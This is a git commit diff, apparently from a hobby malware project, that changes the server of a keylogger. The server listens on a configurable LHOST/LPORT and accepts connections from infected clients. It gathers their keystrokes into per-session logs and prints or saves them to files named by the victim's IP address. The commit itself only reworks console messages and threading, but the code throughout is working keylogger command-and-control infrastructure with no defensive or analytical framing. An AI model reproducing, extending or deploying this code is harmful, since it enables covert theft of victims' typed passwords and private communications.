79e25d72f60989bc521ea38c7f9d1f0157e42aa8
BuildTools <raffsimms23@gmail.com>
2021-08-26 16:25:56 +0100

    UI output message improvements

--- server/server.py
+++ server/server.py
@@ -6,20 +6,7 @@ from datetime import datetime
 from colorama import Fore, Style
 
 
-class StoppableThread(threading.Thread):
-    def __init__(self, *args, **kwargs):
-        threading.Thread.__init__(self)
-        super(StoppableThread, self).__init__(*args, **kwargs)
-        self._stop_event = threading.Event()
-
-    def stop(self):
-        self._stop_event.set()
-
-    def stopped(self):
-        return self._stop_event.is_set()
-
-
-class ClientSession(StoppableThread):
+class ClientSession():
     def __init__(self, session_manager, sid, client):
         self.controller = session_manager
         self.session_id = sid
@@ -35,7 +22,7 @@ class ClientSession(StoppableThread):
                 if data:
                     self.raw_keylogs += data.decode()
             except socket.error as exc:
-                interface.message(0, f"Session {self.session_id} ({self.address[0]}:{self.address[1]}) - Logs Saved", "DISCONNECT", True)
+                interface.message("DISCONNECT", f"Session {self.session_id} ({self.address[0]}:{self.address[1]}) - Logs Saved", colour=Fore.BLUE, line_break=True)
                 if self.alive:
                     self.kill()
     
@@ -64,22 +51,24 @@ class SessionManager:
         if session:
             session.kill()
         else:
-            interface.message(0, f"Session {sid} does not exist.")
+            interface.message("ERROR", f"Session {sid} does not exist.")
 
     def save_logs(self, sid) -> None:
         session = self.get_session(sid)
         if session:
             keylogs = self.__keylogs(session)
-            self.__export_log(session, keylogs)
+            log_status = self.__export_log(session, keylogs)
+            if not log_status:
+                interface.message("ERROR", "Creation of log files or directory not permitted")
         else:
-            interface.message(0, f"Session {sid} does not exist.")
+            interface.message("ERROR", f"Session {sid} does not exist.")
 
     def print_logs(self, sid) -> None:
         session = self.get_session(sid)
         if session:
             print(self.__keylogs(session))
         else:
-            interface.message(0, f"Session {sid} does not exist.")
+            interface.message("ERROR", f"Session {sid} does not exist.")
 
     def __keylogs(self, session) -> None:
         title = f"\nKeyboard logs from - Session {session.session_id} ({session.address[0]}:{session.address[1]})"
@@ -95,9 +84,11 @@ class SessionManager:
             file_name = "Log-{}_{}.txt".format(session.address[0], datetime.now().strftime("%m-%d-%Y_%H-%M-%S"))
             with open("{}/{}".format(LOG_DIRECTORY, file_name), "w") as log:
                 log.write(log_contents)
-            # TODO add save confirmation message
         except PermissionError:
             return False
+        else:
+            interface.message("SUCCESS", f"Saved log for session #{session.session_id} as {file_name}", colour=Fore.GREEN)
+            return True
 
     def dead(self, session):
         self.sessions.remove(session)
@@ -107,17 +98,17 @@ class ListenerServer:
     def __init__(self, address, port):
         self.address = address
         self.port = port
-        self.stopped = False
+        # self.stopped = False - eventually add feature to stop and start listener without restarting script
 
     def connection_gateway(self, listener_socket):
-        interface.message(1, "Listening on {}:{}".format(*listener_socket.getsockname()), "LISTENER", True)
-        while not self.stopped:
+        interface.message("LISTENER", "Listening on {}:{}".format(*listener_socket.getsockname()), colour=Fore.GREEN, line_break=True)
+        while True:
             (client, client_address) = listener_socket.accept()
-            interface.message(1, "Connection from {}:{}".format(*client.getpeername()), "CONNECTION", True)
+            interface.message("CONNECTION", "Connection from {}:{}".format(*client.getpeername()), colour=Fore.GREEN, line_break=True)
 
             new_session = session_manager.add_session(client)
 
-            new_session_handler = StoppableThread(target=new_session.start)
+            new_session_handler = threading.Thread(target=new_session.start)
             new_session_handler.daemon = True
             new_session_handler.start()
 
@@ -126,7 +117,7 @@ class ListenerServer:
         listener_socket.bind((self.address, self.port))
         listener_socket.listen()
 
-        connection_handler_thread = StoppableThread(target=self.connection_gateway, args=[listener_socket])
+        connection_handler_thread = threading.Thread(target=self.connection_gateway, args=[listener_socket])
         connection_handler_thread.daemon = True
         connection_handler_thread.start()
 
@@ -144,11 +135,11 @@ class UserInterface:
             "help": "Display this list.",
             "options": "Display a list of variable options.",
             "set <variable> <value>": "Change the value of one of the available options.",
-            "run": "Run the keylogger connection listener",
+            "start": "Start the keylogger connection listener",
             "kill": "Stop a specified session/client connection.",
             "exit": "Shutdown listener server and close all sessions."
         }
-        self.valid_commands = ("sessions", "logs", "save", "help", "exit", "options", "set", "run", "kill")
+        self.valid_commands = ("sessions", "logs", "save", "help", "exit", "options", "set", "start", "kill")
         self.listener_server = None
 
     def handle_command(self, command, args):
@@ -163,8 +154,8 @@ class UserInterface:
             max_len = max(map(len, self.options))
             print("\n" + "\n".join([f" {' ' * (max_len - len(key)) + key} | {value}" for key, value in self.options.items()]) + "\n")
 
-        elif command == "run":
-            self.listener_server = ListenerServer("0.0.0.0", 6666)
+        elif command == "start":
+            self.listener_server = ListenerServer(self.options["LHOST"], self.options["LPORT"])
             self.listener_server.start()
 
         elif command == "logs":
@@ -172,14 +163,14 @@ class UserInterface:
                 if args[0].isnumeric():
                     session_manager.print_logs(int(args[0]))
                 else:
-                    self.message(0, "Session ID must be a number.")
+                    self.message("ERROR", "Session ID must be a number.")
 
         elif command == "save":
             if len(args) > 0:
                 if args[0].isnumeric():
                     session_manager.save_logs(int(args[0]))
                 else:
-                    self.message(0, "Session ID must be a number.")
+                    self.message("ERROR", "Session ID must be a number.")
 
         elif command == "set":
             if len(args) > 1:
@@ -188,23 +179,23 @@ class UserInterface:
                         if args[1].isnumeric():
                             self.options[args[0].upper()] = int(args[1])
                         else:
-                            self.message(0, "LPORT must be a number.")
+                            self.message("ERROR", "LPORT must be a number.")
                             return
                     else:
                         self.options[args[0].upper()] = args[1]
-                    self.message(1, "Set {} to {}.".format(args[0].upper(), args[1]), "SUCCESS")
+                    self.message("SUCCESS", f"Set {args[0].upper()} to {args[1]}", colour=Fore.GREEN)
                 else:
-                    self.message(0, "Option {} does not exist.".format(args[0].upper()))
+                    self.message("ERROR", f"Option {args[0].upper()} does not exist.")
 
         elif command == "kill":
             if len(args) > 0:
                 if args[0].isnumeric():
                     session_manager.close_session(int(args[0]))
                 else:
-                    self.message(0, "Session ID must be a number.")
+                    self.message("ERROR", "Session ID must be a number.")
 
         elif command == "exit":
-            raise sys.exit(interface.message(0, "Server Stopped", "EXIT"))
+            raise sys.exit(self.message("EXIT", "Stopped."))
 
     def start(self):
         while True:
@@ -217,18 +208,13 @@ class UserInterface:
                     args = []
                 self.handle_command(command_string[0], args)
 
-    def message(self, status, text, symbol = "ERROR", line_break = False):
-        lb = "\n"
-        if status == 0:
-            colour = Fore.RED
-        else:
-            colour = Fore.GREEN
-
-        print(f"{line_break and lb or ''}[{colour}{symbol}{Fore.RESET}] > {text}")
+    def message(self, symbol, text, **kwargs):
+        colour = kwargs.get("colour", Fore.RED)
+        line_break = kwargs.get("line_break", False)
+        print(("{}[{}{}" + Fore.RESET + "] > {}").format("\n" if line_break else "", colour, symbol, text))
 
 
 if __name__ == "__main__":
-
     abspath = os.path.abspath(__file__)
     dname = os.path.dirname(abspath)
     os.chdir(dname)
